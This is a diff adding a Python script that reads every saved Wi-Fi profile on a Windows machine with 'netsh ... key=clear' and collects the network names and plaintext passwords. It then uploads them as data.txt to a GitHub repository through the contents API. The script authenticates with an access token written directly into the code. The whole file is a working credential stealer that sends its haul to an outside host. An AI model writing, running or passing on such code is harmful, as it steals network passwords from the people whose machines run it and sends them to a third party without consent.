@@ -1,0 +1,67 @@
+
+import requests
+import base64
+def get_wlans():
+    import subprocess
+    test = subprocess.run("netsh wlan show profile" ,shell=True , stdout=subprocess.PIPE )
+    wlans=test.stdout.decode().split("\n")[9:]
+    # print(wlans[0][wlans[0].find(":")+1:].strip(), end="")
+    wlans_ssid=[]
+    for i, index in zip(wlans, range(len(wlans)-8)):
+        wlans_ssid.append(wlans[index][wlans[index].find(":")+1:].strip())
+    #print(wlans_ssid)
+
+    password=subprocess.run(f"netsh wlan show profile {wlans_ssid[0]} key=clear" ,shell=True , stdout=subprocess.PIPE).stdout.decode()
+    password=password[password.find("Key Content"):]
+    password=password[password.find(":")+1:password.find("\n")].strip()
+
+    passwords=[]
+    for i, index in zip(wlans_ssid, range(len(wlans_ssid))):
+        passw=""
+        password=subprocess.run(f"netsh wlan show profile {wlans_ssid[index]} key=clear" ,shell=True , stdout=subprocess.PIPE).stdout.decode()
+        password=password[password.find("Key Content"):]
+        passw=password[password.find(":")+1:password.find("\n")].strip()
+        passwords.append(passw)
+    string=""
+    for e, p in zip(wlans_ssid, passwords):
+        string+=f"{e} : {p}\n"
+    return string
+
+# set up the API endpoint and authentication headers
+owner = 'scriptvip'
+repo = 'Ramadan'
+file_path = 'data.txt'
+file_contents = get_wlans()
+commit_message = 'Add a new file'
+branch_name = 'main'
+access_token = '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'
+headers = {'Authorization': f'Bearer {access_token}'}
+
+# encode the file contents in base64 format
+file_contents_base64 = base64.b64encode(file_contents.encode()).decode()
+
+# get the current file content SHA
+response = requests.get(f'https://api.github.com/repos/{owner}/{repo}/contents/{file_path}', headers=headers)
+file_data = response.json()
+file_sha = file_data['sha']
+
+# create the new file data
+new_file_data = {
+    "message": commit_message,
+    "committer": {
+        "name": "Your Name",
+        "email": "your_email@example.com"
+    },
+    "content": file_contents_base64,
+    "sha": file_sha,
+    "branch": branch_name
+}
+# send the PUT request to create the new file
+response = requests.put(f'https://api.github.com/repos/{owner}/{repo}/contents/{file_path}', headers=headers, json=new_file_data)
+
+# check if the request was successful
+if response.status_code == 201:
+    print(f"File {file_path} uploaded successfully.")
+else:
+    print(f"Failed to upload file {file_path}.")
+    #print(f"Error message: {response.json()['message']}")
